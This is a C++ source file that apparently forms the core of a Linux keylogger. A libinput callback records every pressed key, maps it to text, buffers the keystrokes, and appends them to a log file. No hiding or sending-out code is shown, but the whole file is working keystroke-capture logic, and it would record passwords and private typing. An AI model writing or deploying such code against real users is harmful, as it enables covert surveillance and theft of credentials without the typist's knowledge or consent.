#include "../include/helper.hpp"

namespace
{
    int counter = 0;
    std::vector<std::string> keys;
}

static void append_str_to_file(std::string str, std::string filename)
{
    std::ofstream file;
    file.open(filename, std::ios_base::app);
    file << str;
    if(counter == params::newline_limit) {
        file << std::endl;
        counter = 0;
    }
    file.close();
}

int keyboard_event_callback(struct libinput_event *event, void *user_data)
{
    if (libinput_event_get_type(event) == LIBINPUT_EVENT_KEYBOARD_KEY)
    {
        struct libinput_event_keyboard *kb_event = libinput_event_get_keyboard_event(event);
        if (kb_event)
        {
            uint32_t key = libinput_event_keyboard_get_key(kb_event);
            bool is_pressed = libinput_event_keyboard_get_key_state(kb_event) == LIBINPUT_KEY_STATE_PRESSED;
            if(is_pressed) {
                try {
                    keys.push_back(params::key_map.at(key));
                } catch (const std::out_of_range& oor) {
                    std::cerr << "Out of Range error: " << oor.what() << '\n';
                }
            }
            if(keys.size() == params::max_keystrokes) {
                std::string keystrokes;
                for(auto k : keys) {
                    keystrokes += k;
                }
                append_str_to_file(keystrokes, params::filename);
                ++counter;
                keys.clear();
            }
        }
    }
    return 0;
}